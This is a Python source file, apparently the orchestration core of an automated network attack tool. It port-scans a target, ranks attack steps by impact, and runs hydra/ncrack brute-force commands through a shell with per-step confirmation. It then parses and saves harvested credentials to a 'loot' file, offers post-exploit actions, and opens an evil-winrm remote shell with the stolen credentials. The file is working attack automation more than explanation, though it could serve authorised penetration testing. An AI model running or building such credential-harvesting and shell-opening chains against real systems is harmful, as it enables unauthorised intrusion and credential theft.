"""
Chain orchestrator — ties everything together.
This is the main logic that the CLI (or future GUI) calls.
"""

import re
import shlex
from core.display import section, info, ok, warn, bold, cyan, green
from core.executor import run_cmd
from core.checkpoint import Checkpoint
from core.models import AttackPlan, ScanResult, Step
from core.ui_driver import get_ui
from library.scanner import scan_target
from library.post_exploit import post_action_for
from wizard.pipeline import build_plan, step_priority


def run_chain(
    target: str,
    user_wordlist: str,
    pass_wordlist: str,
    checkpoint_path: str | None = None,
    resume: Checkpoint | None = None,
) -> None:
    """
    Full chain attack lifecycle:
    Scan → Build plan → Execute each step with impact confirmation → Summary.

    With `checkpoint_path`, progress is written to that file after the scan,
    after the step selection and after every step. `resume` continues a run
    from such a file: the saved scan and selection are reused and steps that
    already have an outcome are not run again. Every step still asks for its
    own confirmation.
    """
    state = resume or Checkpoint(target=target, user_wordlist=user_wordlist,
                                 pass_wordlist=pass_wordlist)

    scan_results = _scan_for(state, checkpoint_path)
    if not scan_results:
        warn("No open ports found — target may be firewalled or down.")
        return

    section("OPEN PORTS")
    for r in sorted(scan_results, key=lambda x: x.port):
        print(f"  {green(str(r.port).rjust(5))}/tcp  →  {cyan(r.service or 'unknown')}")
        get_ui().status("scan_result", f"{r.port}/tcp → {r.service or 'unknown'}",
                        {"port": r.port, "service": r.service or "unknown"})

    plan = build_plan(state.target, state.user_wordlist, state.pass_wordlist, scan_results)
    if state.logfile:
        plan.logfile = state.logfile
    if not plan.steps:
        warn("No attack steps to execute.")
        return
    state.logfile = plan.logfile
    get_ui().status("logfile", plan.logfile, {"path": plan.logfile})

    if state.selected is None:
        plan.steps = _select_steps(plan.steps)
        state.selected = [Checkpoint.step_key(port, service, step.tool, step.name)
                          for port, service, step in plan.steps]
    else:
        plan.steps = _steps_from_keys(plan.steps, state.selected)
    if not plan.steps:
        warn("No steps selected — nothing to run.")
        return
    _save(state, checkpoint_path)

    section("EXECUTING ATTACK PLAN")
    keys = {Checkpoint.step_key(port, service, step.tool, step.name)
            for port, service, step in plan.steps}
    already = [key for key in state.outcomes if key in keys]
    if already:
        info(f"Resuming: {len(already)} step(s) already finished in an earlier run, not run again.")

    for port, service, step in plan.steps:
        key = Checkpoint.step_key(port, service, step.tool, step.name)
        if key in state.outcomes:
            continue
        state.outcomes[key] = _execute_step(plan, port, service, step)
        _save(state, checkpoint_path)

    outcomes = [state.outcomes[key] for key in keys if key in state.outcomes]
    done = sum(1 for r in outcomes if r == "done" or r.startswith("cred:"))
    skipped = sum(1 for r in outcomes if r == "skipped")
    creds_found = [r.removeprefix("cred:") for r in outcomes if r.startswith("cred:")]

    state.finished = True
    _save(state, checkpoint_path)

    section("CHAIN COMPLETE")
    ok(f"Executed: {done}")
    warn(f"Skipped: {skipped}")
    info(f"Log file: {plan.logfile}")
    for cred in creds_found:
        ok(f"Credential harvested: {cred}")
    print()
    get_ui().status("summary", f"Executed: {done} · Skipped: {skipped}",
                    {"executed": done, "skipped": skipped,
                     "creds_found": creds_found, "logfile": plan.logfile})


def _scan_for(state: Checkpoint, checkpoint_path: str | None) -> list[ScanResult]:
    if state.scan is not None:
        return [ScanResult(port=item["port"], service=item["service"]) for item in state.scan]
    results = scan_target(state.target)
    state.scan = [{"port": r.port, "service": r.service} for r in results]
    _save(state, checkpoint_path)
    return results


def _steps_from_keys(
    steps: list[tuple[int, str, Step]],
    keys: list[str],
) -> list[tuple[int, str, Step]]:
    by_key = {Checkpoint.step_key(port, service, step.tool, step.name): (port, service, step)
              for port, service, step in steps}
    return [by_key[key] for key in keys if key in by_key]


def _save(state: Checkpoint, checkpoint_path: str | None) -> None:
    if checkpoint_path:
        state.save(checkpoint_path)


def _select_steps(
    steps: list[tuple[int, str, Step]],
) -> list[tuple[int, str, Step]]:
    """
    Show all queued steps ranked by exploitation impact (highest first,
    (recommended) = high-value) and let the user pick which to run.
    """
    ranked = sorted(steps, key=lambda t: (-step_priority(t[2]), t[0]))

    items = [
        {"port": port, "service": service, "tool": step.tool,
         "name": step.name, "priority": step_priority(step)}
        for port, service, step in ranked
    ]
    raw = get_ui().multiselect(
        "Attack plan — ranked by impact (pick what to run)", items,
    ).strip().lower()

    if raw in ("a", ""):
        return ranked
    if raw == "0":
        return []
    if raw == "r":
        chosen = [t for t in ranked if step_priority(t[2]) >= 4]
        if not chosen:
            warn("No (recommended) high-impact steps found — falling back to all.")
            return ranked
        return chosen

    picks: set[int] = set()
    for part in raw.split(","):
        part = part.strip()
        if part.isdigit():
            idx = int(part) - 1
            if 0 <= idx < len(ranked):
                picks.add(idx)
    if not picks:
        warn("Nothing valid selected — nothing will run.")
    return [ranked[i] for i in sorted(picks)]


def _execute_step(
    plan: AttackPlan,
    port: int,
    service: str,
    step: Step,
) -> str:
    """
    Execute a single attack step:
    1. Print details and impact
    2. Ask for explicit confirmation
    3. Run the command
    4. If brute-force on WinRM port, attempt to parse credentials and offer evil-winrm.
    """
    # evil-winrm (and any credential-required follow-up) must never run as a
    # standalone step — it's reached only via _offer_winrm after a brute-force
    # step harvests a real credential. pipeline._primary_steps already filters
    # these out; this guard is a safety net.
    if step.tool == "evil-winrm":
        return "skipped"

    # userlist/passlist are shell-quoted here (not at the source) because
    # they can be arbitrary filesystem paths -- Windows paths with spaces
    # (GUI Browse... dialog) or anything else a user picks -- and every
    # command_template in attack_map.json substitutes them unquoted, then
    # runs through subprocess shell=True (core/executor.run_cmd). An
    # unquoted space in the path silently truncates the wordlist arg and
    # was reproduced causing a false "file not found"-shaped hydra failure.
    cmd = step.command_template.format(
        target=plan.target,
        userlist=shlex.quote(plan.user_wordlist),
        passlist=shlex.quote(plan.pass_wordlist),
    )

    title = f"Port {port} ({service}) — {step.name} [{step.tool}]"
    if not get_ui().confirm(cmd, step.impact, title=title):
        warn("Skipped.")
        get_ui().status("step_done", f"[{step.tool}] {step.name} — skipped",
                        {"port": port, "service": service, "tool": step.tool,
                         "name": step.name, "outcome": "skipped"})
        return "skipped"

    # run_cmd() blocks synchronously until the real tool exits (up to its
    # timeout, default 600s) with zero output in between — a full hydra
    # wordlist or nmap scan can legitimately take minutes. Emit a
    # "running" row now so the GUI shows the step is in flight rather than
    # looking frozen for however long the real command takes.
    get_ui().status("step_start", f"[{step.tool}] {step.name} — running",
                    {"port": port, "service": service, "tool": step.tool,
                     "name": step.name})
    output, _ = run_cmd(cmd, plan.logfile)

    # ─── Post-step: harvest credentials from any brute-force step ──
    if step.tool in ("hydra", "ncrack"):
        creds = _parse_creds(output)
        if creds:
            loot = _save_loot(plan, port, service, creds)
            print()
            for user, password in creds:
                ok(f"CREDENTIAL  {bold(f'{port}/{service}')}  "
                   f"{green(f'{user}:{password}')}")
                get_ui().status("cred_found", f"{user}:{password} on {port}/{service}",
                                {"port": port, "service": service,
                                 "user": user, "password": password})
            info(f"Saved {len(creds)} credential(s) → {loot}")

            # Exploit stage: WinRM ports pop a shell via evil-winrm; any other
            # service offers its mapped post-exploit action (share/db/file enum).
            if port in (5985, 5986):
                _offer_winrm(plan, port, creds[0])
            else:
                _offer_post_exploit(plan, port, service, creds[0])

            user, password = creds[0]
            return f"cred:{port}/{service} {user}:{password}"

    _echo_output(output)
    get_ui().status("step_done", f"[{step.tool}] {step.name} — done",
                    {"port": port, "service": service, "tool": step.tool,
                     "name": step.name, "outcome": "done"})
    return "done"


def _parse_creds(output: str) -> list[tuple[str, str]]:
    """Extract (login, password) pairs from hydra/ncrack output lines."""
    creds: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for line in output.splitlines():
        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if m:
            pair = (m.group(1), m.group(2))
            if pair not in seen:
                seen.add(pair)
                creds.append(pair)
    return creds


def _save_loot(
    plan: AttackPlan,
    port: int,
    service: str,
    creds: list[tuple[str, str]],
) -> str:
    """Append harvested credentials to a per-target loot file. Returns its path."""
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", plan.target)
    path = f"loot_{safe}.txt"
    with open(path, "a", encoding="utf-8") as f:
        for user, password in creds:
            f.write(f"{plan.target}\t{port}/{service}\t{user}:{password}\n")
    return path


def _offer_post_exploit(
    plan: AttackPlan,
    port: int,
    service: str,
    cred: tuple[str, str],
) -> None:
    """Offer the mapped post-exploit action for a non-WinRM harvested credential."""
    action = post_action_for(service, port)
    if not action:
        info(f"No post-exploit action mapped for {service} — credential saved for manual use.")
        return

    # NOT shlex-quoted (unlike userlist/passlist below): several
    # post_exploit.json templates embed {user}/{password} *inside* their own
    # single-quoted printf string (ftp/telnet banner-grab) -- wrapping the
    # substitution in another layer of quotes there would break out of that
    # quoting instead of protecting it. Credentials here always originate
    # from this run's own hydra/ncrack parse, not attacker-controlled input.
    user, password = cred
    cmd = action["command_template"].format(
        target=plan.target, user=user, password=password,
    )
    title = f"Post-exploit — {action.get('desc', 'Post-exploit action')} [{action.get('tool', '')}]"
    impact = action.get("impact", "Uses the harvested credential against the service.")
    if get_ui().confirm(cmd, impact, title=title):
        out, _ = run_cmd(cmd, plan.logfile)
        _echo_output(out)
    else:
        warn("Post-exploit skipped.")


def _offer_winrm(
    plan: AttackPlan,
    port: int,
    cred: tuple[str, str],
) -> None:
    """Offer to open an evil-winrm shell using a harvested WinRM credential."""
    username, password = cred
    ssl_flag = " -S" if port == 5986 else ""
    ev_cmd = (
        f"evil-winrm -i {plan.target} "
        f"-u {shlex.quote(username)} -p {shlex.quote(password)}{ssl_flag}"
    )
    impact = ("Active WinRM session — Event IDs 4648 (logon), "
               "4672 (admin) are generated and auditable.")
    title = f"Connect via evil-winrm — {plan.target}"
    if get_ui().confirm(ev_cmd, impact, title=title):
        get_ui().open_shell(ev_cmd, title=title)
        info("evil-winrm session opened in its own window — type `exit` there to return.")
    else:
        warn("evil-winrm connection skipped.")
    return None


def _echo_output(output: str, max_lines: int = 40) -> None:
    """Print captured command output on screen, indented, capped at max_lines."""
    text = (output or "").strip()
    if not text:
        info("(no output returned)")
        return
    lines = text.splitlines()
    section("RESULT")
    for line in lines[:max_lines]:
        print(f"  {line}")
    if len(lines) > max_lines:
        info(f"... {len(lines) - max_lines} more line(s) — see log file for full output.")